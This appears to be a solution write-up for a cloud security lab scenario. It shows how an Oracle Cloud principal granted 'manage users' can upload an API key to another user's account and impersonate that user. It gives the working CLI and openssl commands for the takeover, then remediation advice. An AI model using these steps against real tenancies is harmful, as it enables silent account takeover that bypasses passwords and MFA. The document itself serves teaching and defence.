# SCN-IAM-003: Solution

## Root cause

The test user's group has one statement: `manage users in tenancy`.
`manage` sits at the top of OCI's cumulative permission hierarchy for
the `users` resource-type, and it includes `USER_APIKEY_ADD`. That
permission covers `UploadApiKey`, and Oracle's own CLI documents exactly
what that means:

> Every user has permission to use this operation to upload a key for
> their own user ID. [...] To compare, administrators who have
> permission to the tenancy can use this operation to upload a key for
> any user, including themselves.

Source: `oci iam user api-key upload --help`, Oracle Cloud Infrastructure CLI.

A principal with `manage users` can generate an RSA keypair, upload the
public half to any other user's account, and authenticate as that user
with the private half. No password, no MFA prompt, nothing that alerts
the account's real owner.

## How to confirm it, step by step

Read what the test user's policy actually grants:

```bash
oci iam policy get --policy-id <policy-ocid> --profile DEFAULT
```

One statement: `manage users in tenancy`. That's the entire grant.

Generate a second keypair, separate from the test user's own:

```bash
openssl genrsa -out impersonation.pem 2048
openssl rsa -pubout -in impersonation.pem -out impersonation_public.pem
```

Upload the public half to the other user, using only the test user's
credential:

```bash
oci iam user api-key upload \
  --user-id $(terraform output -raw target_admin_ocid) \
  --key-file impersonation_public.pem \
  --profile SCN-IAM-003
```

This succeeds and returns a fingerprint. Set up a third CLI profile
using the target user's OCID, that fingerprint, and the private half of
the new keypair. Wait a few seconds for the key to propagate, then:

```bash
oci iam user get --user-id $(terraform output -raw target_admin_ocid) --profile impersonated
```

This returns the target user's own name and OCID. The credential
authenticates as them, not as the test user who created it. Any
capability that user's group carries now belongs to whoever holds this
key.

## What this does and doesn't prove

It proves that `manage users` grants full impersonation of any user in
scope, indefinitely, without touching a password or MFA device. It does
not prove a flaw in Oracle's platform. The permission is documented, and
the CLI's own help text states plainly that an administrator with this
grant can upload a key for any user. The mistake is granting `manage
users` to a principal that only needed to do something narrower, like
disabling stale accounts.

It doesn't demonstrate access to a real administrator's account. The
target user in this lab is a fixture, created and destroyed by this
scenario. It also doesn't demonstrate any OCI-side alert for this kind
of upload; whether one exists wasn't researched for this scenario.

## Remediation

- Treat `manage users` as equivalent to holding a master credential for
  every account in scope, not as routine account administration.
- Scope credential-adjacent verbs (`manage users`, and by extension
  `USER_APIKEY_ADD`/`USER_APIKEY_REMOVE`) to a small, audited group.
  Don't grant them alongside unrelated user-management tasks.
- Periodically audit API keys per user. A key that its owner didn't
  create is the direct artifact of this technique.
- Rotate and monitor credentials for any account that a principal with
  `manage users` could have touched, the same way you'd treat exposure
  of that account's password.
